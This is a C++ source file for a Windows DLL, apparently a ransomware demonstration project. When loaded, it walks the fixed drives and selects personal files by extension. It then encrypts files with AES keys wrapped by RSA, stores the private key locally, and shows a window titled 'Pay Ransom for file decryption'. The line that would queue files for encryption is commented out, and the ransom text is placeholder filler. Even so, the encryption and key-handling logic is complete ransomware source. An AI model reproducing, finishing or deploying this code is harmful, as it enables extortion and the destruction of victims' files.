// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

#include <cstdlib>
#include <iostream>
#include <vector>
#include <set>
#include <tuple>
#include <fstream>
#include <iostream>

#include <windows.h>

#include <openssl\bio.h>
#include <openssl\pem.h>

#include "..\..\RansomwareExample\RansomwareExample\AESCrypto.h"
#include "..\..\RansomwareExample\RansomwareExample\RSACrypto.h"

#include <boost\filesystem.hpp>

using namespace std;
using namespace boost::filesystem;

const int   screenSize_X = 640;
const int   screenSize_Y = 480;


vector<wstring>* get_available_drives();
set<wstring>* get_wanted_extentions();

//
//
// WndProc - Window procedure
//
//
LRESULT
CALLBACK
WndProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_DESTROY:
		::PostQuitMessage(0);
		break;
	default:
		return ::DefWindowProc(hWnd, uMsg, wParam, lParam);
	}

	return 0;
}



BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH: {
		vector<wstring>* available_drives = get_available_drives();
		set<wstring>* wanted_extentions = get_wanted_extentions();

		printf("Gathering file paths\n");

		vector<wstring> file_paths = vector<wstring>();
		printf("Generating RSA key\n");
		RSACrypto rsa = RSACrypto();
		// Test
		// wstring drive = wstring(L"C:\\Users\\irslambouf\\Desktop\\test");
		for (wstring drive : *available_drives) {
			if (drive == L"C:\\") {
				drive += L"Users";
			}

			wprintf(L"Trying - %s\n", &drive[0]);
			recursive_directory_iterator dir(drive), end;

			set<wstring> unwanted_folders = set<wstring>();
			unwanted_folders.insert(L"Windows");
			unwanted_folders.insert(L"AppData");
			unwanted_folders.insert(L"Microsoft");

			while (dir != end) {
				try
				{
					if (is_directory(dir->path())) {
						// Exclude certain paths 
						for (wstring partial_folder_name : unwanted_folders) {
							if (dir->path().wstring().find(partial_folder_name) != wstring::npos) {
								wprintf(L"Ignoring folder %s\n", &(dir->path().wstring())[0]);
								// Don't iterate further into folder
								dir.no_push();
								break;
							}
						}
					}

					if (is_regular_file(dir->path())) {
						// Only gather files with particular extentions
						if (wanted_extentions->find(dir->path().extension().wstring()) != wanted_extentions->end()) {
							wprintf(L"\t-%s\n", &(dir->path().wstring())[0]);
							//file_paths.push_back(dir->path().wstring());
						}
					}

					++dir;
				}
				catch (const filesystem_error& ex)
				{
					printf("PROBLEM PATH - %s\n", dir->path());
					printf("%s\n", ex.what());
				}
			}

			printf("Generating AES key\n");
			AESCrypto aes = AESCrypto();

			wprintf(L"Gathered %d files for encryption\n", file_paths.size());
			for (wstring path_str : file_paths) {
				unsigned char * aes_key_and_tag = new unsigned char[32 + 16]();
				aes.get_aes_key(aes_key_and_tag);

				if (aes.in_place_encrypt(path_str, aes_key_and_tag + 32) > 0) { // Fill last 16 bytes with gcm tag
					wprintf(L"Successfully encrypted - %s\n", &(path_str)[0]);
				}
				else {
					wprintf(L"Failed encryption - %s\n", &(path_str)[0]);
				}

				wstring key_path = path_str + L".key";
				wprintf(L"Encrypting key for %s\n", &path_str[0]);
				rsa.encrypt_key(key_path, aes_key_and_tag, 32 + 16);
			}
		}

		printf("Saving RSA key\n");
		/* Save encrypted RSA private key */
		BIO *out = BIO_new_file("C:\\Users\\Public\\priv.key", "w");
		EVP_PKEY *priv_key = EVP_PKEY_new();
		EVP_PKEY_set1_RSA(priv_key, rsa.get_rsa());
		if (!PEM_write_bio_PKCS8PrivateKey(out, priv_key, EVP_aes_256_cbc(), NULL, NULL, NULL, "SuP3RS3Cr3tPa$$w0Rd")) {
			printf("Failed to write private key, exiting...");
		}
		else {
			printf("Successfully encrypted RSA key... exiting");
		}
		/* Clean up memory */
		EVP_PKEY_free(priv_key);
		BIO_free_all(out);
		rsa.free_all();

		// Show ransom
		// Setup window class attributes.
		WNDCLASSEX wcex;
		ZeroMemory(&wcex, sizeof(wcex));

		wcex.cbSize = sizeof(wcex);	// WNDCLASSEX size in bytes
		wcex.style = CS_HREDRAW | CS_VREDRAW;		// Window class styles
		wcex.lpszClassName = TEXT("MYFIRSTWINDOWCLASS");	// Window class name
		wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);	// Window background brush color.
		wcex.hCursor = LoadCursor(hModule, IDC_ARROW); // Window cursor
		wcex.lpfnWndProc = WndProc;		// Window procedure associated to this window class.
		wcex.hInstance = hModule;	// The application instance.

									// Register window and ensure registration success.
		if (!RegisterClassEx(&wcex))
			return 1;

		// Setup window initialization attributes.
		CREATESTRUCT cs;
		ZeroMemory(&cs, sizeof(cs));

		cs.x = 0;	// Window X position
		cs.y = 0;	// Window Y position
		cs.cx = 640;	// Window width
		cs.cy = 480;	// Window height
		cs.hInstance = hModule; // Window instance.
		cs.lpszClass = wcex.lpszClassName;		// Window class name
		cs.lpszName = TEXT("Pay Ransom for file decryption");	// Window title
		cs.style = WS_OVERLAPPEDWINDOW;		// Window style

											// Create the window.
		HWND hWnd = ::CreateWindowEx(
			cs.dwExStyle,
			cs.lpszClass,
			cs.lpszName,
			cs.style,
			cs.x,
			cs.y,
			cs.cx,
			cs.cy,
			cs.hwndParent,
			cs.hMenu,
			cs.hInstance,
			cs.lpCreateParams);

		// Validate window.
		if (!hWnd)
			return 1;

		

		// Display the window.
		::ShowWindow(hWnd, SW_SHOWDEFAULT);
		::UpdateWindow(hWnd);

		HDC hdc = GetDC(hWnd);
		RECT rect;
		GetClientRect(hWnd, &rect);
		LPCWSTR text = L"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.";
		
		DrawText(hdc, text, wcslen(text), &rect, DT_CENTER | DT_VCENTER);
		ReleaseDC(hWnd, hdc);
		/*RECT rect;
		GetClientRect(hWnd, &rect);
		::RedrawWindow(hWnd, &rect, NULL, RDW_INTERNALPAINT);*/

		// Main message loop.
		MSG msg;
		while (::GetMessage(&msg, hWnd, 0, 0) > 0)
			::DispatchMessage(&msg);

		// Unregister window class, freeing the memory that was
		// previously allocated for this window.
		::UnregisterClass(wcex.lpszClassName, hModule);

		return (int)msg.wParam;
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

vector<wstring>* get_available_drives() {

	vector<wstring>* drives = new vector<wstring>();

	WCHAR myDrives[512];
	UINT driveType;

	if (!GetLogicalDriveStringsW(ARRAYSIZE(myDrives) - 1, myDrives))
	{
		wprintf(L"GetLogicalDrives() failed with error code: %lu \n", GetLastError());
	}
	else
	{
		wprintf(L"This machine has the following logical drives: \n");

		for (LPWSTR drive = myDrives; *drive != 0; drive += 4)
		{
			driveType = GetDriveTypeW(drive);
			wprintf(L"Drive %s is type %d \n", drive, driveType);
			// Only deal with local drives
			if (driveType == DRIVE_FIXED) {
				wstring drive_string(drive);
				drives->push_back(drive_string);
			}
		}
	}

	return drives;
}

set<wstring>* get_wanted_extentions() {
	set<wstring>* extentions = new set<wstring>();
	// Text
	extentions->insert(L".pdf");
	extentions->insert(L".doc");
	extentions->insert(L".docx");
	extentions->insert(L".txt");
	extentions->insert(L".xls");
	extentions->insert(L".csv");
	// Images 
	extentions->insert(L".jpg");
	extentions->insert(L".jpeg");
	extentions->insert(L".png");
	extentions->insert(L".gif");
	// Video
	extentions->insert(L".webm");
	extentions->insert(L".mkv");
	extentions->insert(L".avi");
	extentions->insert(L".flv");
	extentions->insert(L".mp4");
	extentions->insert(L".wmv");
	extentions->insert(L".mpg");
	extentions->insert(L".mpeg");
	// Compressed
	extentions->insert(L".tar");
	extentions->insert(L".gz");
	extentions->insert(L".zip");
	extentions->insert(L".7z");
	extentions->insert(L".rar");
	// Executables
	/*extentions->insert(L".exe");
	extentions->insert(L".msi");
	extentions->insert(L".bin");
	extentions->insert(L".iso");*/

	return extentions;
}